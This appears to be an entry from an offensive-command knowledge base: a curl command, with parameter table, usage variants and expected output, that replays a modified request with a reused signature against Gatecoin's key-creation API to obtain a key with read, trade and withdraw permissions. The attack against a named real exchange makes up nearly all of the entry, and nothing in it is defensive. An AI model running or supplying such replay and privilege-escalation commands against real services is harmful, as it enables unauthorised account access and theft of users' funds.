---
id: cmd-curl-replay-modified
data: >-
  curl -X POST 'https://api.gatecoin.com/api/v1/keys' -H 'Authorization: Bearer
  REUSED_SIGNATURE' -H 'Content-Type: application/json' -d
  '@initial_request.json' --output escalated_key.json
tags:
  - api-replay
  - escalation
type: command
output: JSON with escalated API key if successful.
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.789Z'
verified: false
validated: true
submitted: true
---
# curl-replay-modified-key

## Command

```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer REUSED_SIGNATURE' \
  -H 'Content-Type: application/json' \
  -d '@initial_request.json' \
  --output escalated_key.json
```

## Description

Replays a modified API request to Gatecoin using a reused signature to create an escalated privilege key, exploiting payload exclusion in signing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H 'Authorization: Bearer REUSED_SIGNATURE'` | Original signature | Yes |
| `-H 'Content-Type: application/json'` | JSON type | Yes |
| `-d '@initial_request.json'` | Modified payload file | Yes |
| `--output escalated_key.json` | Save response | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' -H 'Authorization: Bearer SIG' -d '@modified.json'
```

### Advanced Usage

```bash
curl -v -X POST 'https://api.gatecoin.com/api/v1/keys' -H 'Authorization: Bearer SIG' -d '@modified.json' -w '%{http_code}'
```

## Expected Output

Success: `{"key": "escalated-id", "permissions": ["read", "trade", "withdraw"]}`. Failure: HTTP 401 timestamp or auth error.

## Related

- [[commands/curl-test-replay-cache]]
- [[procedures/Replay-Modified-API-Request-for-Privilege-Escalation]]
